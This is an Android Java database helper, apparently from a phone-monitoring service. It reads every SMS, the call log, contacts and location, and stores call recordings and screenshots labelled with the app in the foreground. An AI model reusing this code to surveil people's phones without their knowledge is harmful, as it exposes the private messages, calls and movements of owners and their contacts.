package com.sunnet.service.db;

import android.content.ContentResolver;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;

import com.sunnet.service.application.MyApplication;
import com.sunnet.service.db.bo.CallLogBo;
import com.sunnet.service.db.bo.CallVoiceBo;
import com.sunnet.service.db.bo.CaptureBo;
import com.sunnet.service.db.bo.ContactBo;
import com.sunnet.service.db.bo.LocationBo;
import com.sunnet.service.db.bo.SMSBo;
import com.sunnet.service.db.entity.CallLogEntity;
import com.sunnet.service.db.entity.CallVoiceEntity;
import com.sunnet.service.db.entity.CaptureEntity;
import com.sunnet.service.db.entity.ContactEntity;
import com.sunnet.service.db.entity.LocationEntity;
import com.sunnet.service.db.entity.SMSEntity;
import com.sunnet.service.log.Log;
import com.sunnet.service.util.ConfigApi;
import com.sunnet.service.util.Utils;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * All software created will be owned by
 * Patient Doctor Technologies, Inc. in USA
 */
public class DatabaseHelper {
    private static CallVoiceBo callVoiceBo = new CallVoiceBo();
    private static CallLogBo callLogBo = new CallLogBo();
    private static LocationBo locationBo = new LocationBo();
    private static CaptureBo captureBo = new CaptureBo();
    private static SMSBo smsBo = new SMSBo();
    private static ContactBo contactBo = new ContactBo();

    //public static SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy, MMM dd HH:mm:ss");

    /**
     * Location
     */
    public static LocationEntity genLocationEntity(Location location) {
        if (location == null)
            return null;
        LocationEntity locationEntity = new LocationEntity();
        locationEntity.setDate(String.valueOf(Calendar.getInstance().getTimeInMillis() / 1000));
        locationEntity.setLatitude(String.valueOf(location.getLatitude()));
        locationEntity.setLongitude(String.valueOf(location.getLongitude()));
        locationEntity.setId(String.valueOf(location.getLatitude()) + "," + String.valueOf(location.getLongitude()));
        return locationEntity;
    }

    public static LocationEntity getLastLocation() {
        try {
            if (locationBo == null)
                locationBo = new LocationBo();
            return locationBo.getLastEntity();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }


    public static void createLocation(LocationEntity entity) {
        if (entity == null)
            return;
        try {
            if (locationBo == null)
                locationBo = new LocationBo();
            locationBo.createOrUpdateEntity(entity);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    public static List<LocationEntity> getAllLocationFromDb() {
        try {
            if (locationBo == null)
                locationBo = new LocationBo();
            return locationBo.getAll();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void deleteLocation(List<LocationEntity> locList) {
        if (locList != null && locList.size() > 0) {
            try {
                if (locationBo == null)
                    locationBo = new LocationBo();
                locationBo.deleteAll(locList);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Call Log
     */
    public static List<CallLogEntity> getAllCallLog() {

        try {
            List<CallLogEntity> callLogList = new ArrayList<>();
            Cursor c = MyApplication.getContext()
                    .getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, CallLog.Calls.DATE + " DESC");

            int number = c.getColumnIndex(CallLog.Calls.NUMBER);
            int type = c.getColumnIndex(CallLog.Calls.TYPE);
            int date = c.getColumnIndex(CallLog.Calls.DATE);
            int duration = c.getColumnIndex(CallLog.Calls.DURATION);
            String dir;
            while (c.moveToNext()) {
                CallLogEntity entity = new CallLogEntity();
                entity.setPhoneNumber(c.getString(number));
                entity.setDate(c.getString(date));
                entity.setDuration(c.getString(duration));

                dir = "";
                int callType = Integer.parseInt(c.getString(type));
                switch (callType) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                entity.setType(dir);
                entity.setId(String.valueOf(Calendar.getInstance().getTimeInMillis() / 1000));
                callLogList.add(entity);
            }
            c.close();
            return callLogList;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void createAllCallLog(List<CallLogEntity> callLogList) {
        if (callLogList != null && callLogList.size() > 0) {
            try {
                if (callLogBo == null)
                    callLogBo = new CallLogBo();
                callLogBo.createAll(callLogList);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    public static void createACallLog(CallLogEntity callLog) {
        if (callLog != null) {
            try {
                if (callLogBo == null)
                    callLogBo = new CallLogBo();
                callLogBo.createOrUpdateEntity(callLog);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Call Voice
     */
    public static List<CallVoiceEntity> getAllCallVoiceFromDb() {
        try {
            if (callVoiceBo == null)
                callVoiceBo = new CallVoiceBo();
            return callVoiceBo.getAll();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void createAllVoiceCall(List<CallVoiceEntity> list) {
        if (list != null && list.size() > 0) {
            try {
                if (callVoiceBo == null)
                    callVoiceBo = new CallVoiceBo();
                callVoiceBo.createAll(list);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static CallVoiceEntity createVoiceCall(String phoneNumber, String phoneName, String audio) {
        try {
            if (callVoiceBo == null)
                callVoiceBo = new CallVoiceBo();
            CallVoiceEntity entity = new CallVoiceEntity(
                    String.valueOf(SystemClock.currentThreadTimeMillis()),
                    String.valueOf(Calendar.getInstance().getTimeInMillis() / 1000),
                    phoneNumber, phoneName, audio);
            //entity.encrypt();
            callVoiceBo.createOrUpdateEntity(entity);
            Log.i(CallVoiceEntity.class.getName() + entity.toString() + " insert successfully");
            return entity;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void deleteVoiceCall(CallVoiceEntity entity) {
        try {
            if (callVoiceBo == null)
                callVoiceBo = new CallVoiceBo();
            callVoiceBo.deleteEntity(entity);
            Utils.deleteDir(entity.getAudio());
            Log.i(CallVoiceEntity.class.getName() + entity.toString() + " delete successfully");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * SMS
     */
    public static List<SMSEntity> getAllSmsFromDevice() {
        List<SMSEntity> inboxList = getAllSms(Uri.parse("content://sms/inbox"), 1);
        List<SMSEntity> sentList = getAllSms(Uri.parse("content://sms/sent"), 0);
        List<SMSEntity> all = new ArrayList<>();
        if (inboxList != null)
            all.addAll(inboxList);
        if (sentList != null)
            all.addAll(sentList);
        return all;
    }

    private static List<SMSEntity> getAllSms(Uri uri, int type) {
        //-- Get all sms
        try {
            List<SMSEntity> smsList = new ArrayList<>();
            Cursor c = MyApplication.getContext().getContentResolver().query(uri, null, null, null, null);

            // Read the sms data and store it in the list
            int indexBody = c.getColumnIndex("body");
            int indexAddress = c.getColumnIndex("address");
            int indexDate = c.getColumnIndex("date");
            String receiver = Utils.getPhoneNumber();
            Log.i("SMS receiver: " + receiver);
            long timeLongCurr = Calendar.getInstance().getTimeInMillis() / 1000;
            while (c.moveToNext()) {
                if (!ConfigApi.ignoreSms(c.getString(indexAddress))) {
                    SMSEntity entity = new SMSEntity();
                    entity.setType(type);
                    entity.setBody(c.getString(indexBody));
                    entity.setSender(c.getString(indexAddress).replace("+84", "0"));
                    entity.setReceiver(receiver);
                    entity.setDate(c.getString(indexDate));
                    entity.setId(String.valueOf(timeLongCurr++));
                    //Log.i(entity.toString());

                    //-- Encrypt data before insert into database
                    entity.encrypt();
                    smsList.add(entity);
                }
            }
            c.close();
            return smsList;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static List<SMSEntity> getAllSmsFromDb() {
        try {
            if (smsBo == null)
                smsBo = new SMSBo();
            return smsBo.getAll();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static List<SMSEntity> getAllSmsFromDbByStatus(int status) {
        try {
            if (smsBo == null)
                smsBo = new SMSBo();
            return smsBo.getAllByStatus(status);
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void createAllSms(List<SMSEntity> smsList) {
        if (smsList != null && smsList.size() > 0) {
            try {
                if (smsBo == null)
                    smsBo = new SMSBo();
                smsBo.createAll(smsList);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    public static void createASms(SMSEntity sms) {
        if (sms != null) {
            try {
                if (smsBo == null)
                    smsBo = new SMSBo();
                smsBo.createOrUpdateEntity(sms);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    public static void deleteSms(List<SMSEntity> smsList) {
        if (smsList != null && smsList.size() > 0) {
            try {
                if (smsBo == null)
                    smsBo = new SMSBo();
                smsBo.deleteAll(smsList);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    public static void updateSms(List<SMSEntity> smsList) {
        if (smsList != null && smsList.size() > 0) {
            try {
                if (smsBo == null)
                    smsBo = new SMSBo();
                smsBo.updateAll(smsList);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Contact
     */
    public static void createAllContact(List<ContactEntity> list) {
        if (list != null && list.size() > 0) {
            try {
                if (contactBo == null)
                    contactBo = new ContactBo();
                contactBo.createAll(list);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    public static void updateAllContact(List<ContactEntity> list) {
        if (list != null && list.size() > 0) {
            try {
                if (contactBo == null)
                    contactBo = new ContactBo();
                contactBo.updateAll(list);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    public static List<ContactEntity> getAllContactFromDb() {
        try {
            if (contactBo == null)
                contactBo = new ContactBo();
            return contactBo.getAll();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static List<ContactEntity> getAllContactFromDevice() {
        List<ContactEntity> contactList = new ArrayList<>();
        ContentResolver cr = MyApplication.getContext().getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                ContactEntity entity = new ContactEntity();
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

                    // get the phone number
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    String phone = "";
                    while (pCur.moveToNext()) {
                        phone += pCur.getString(
                                pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phone += ";";
                    }
                    pCur.close();

                    entity.setId(id);
                    entity.setDate(String.valueOf(Calendar.getInstance().getTimeInMillis() / 1000));
                    entity.setPhone(phone.replace("+84", "0"));
                    entity.setName(name);
                    entity.encrypt();
                    contactList.add(entity);
                }
            }
        }
        cur.close();
        return contactList;
    }

    /**
     * Screenshot
     */
    public static CaptureEntity genCaptureEntity(String filePath, String topPackage) {
        long timeLongCurr = Calendar.getInstance().getTimeInMillis() / 1000;
        CaptureEntity entity = new CaptureEntity();
        entity.setId(String.valueOf(timeLongCurr));
        entity.setPhone(Utils.getPhoneNumber());
        entity.setDate(String.valueOf(timeLongCurr));
        entity.setPicture(filePath);
        entity.setTopPackage(topPackage);
        return entity;
    }

    public static void createACapture(CaptureEntity entity) {
        if (entity == null)
            return;
        try {
            if (captureBo == null) {
                captureBo = new CaptureBo();
            }
            captureBo.createOrUpdateEntity(entity);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    public static void createAllCapture(List<CaptureEntity> list) {
        if (list == null || list.size() == 0)
            return;
        try {
            if (captureBo == null) {
                captureBo = new CaptureBo();
            }
            captureBo.createAll(list);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    public static List<CaptureEntity> getAllCaptureFromDb() {
        try {
            if (captureBo == null) {
                captureBo = new CaptureBo();
            }
            return captureBo.getAll();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void deleteCapture(CaptureEntity entity) {
        try {
            if (captureBo == null)
                captureBo = new CaptureBo();
            captureBo.deleteEntity(entity);
            Utils.deleteDir(entity.getPicture());
            Log.i(CaptureEntity.class.getName() + entity.toString() + " delete successfully");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}
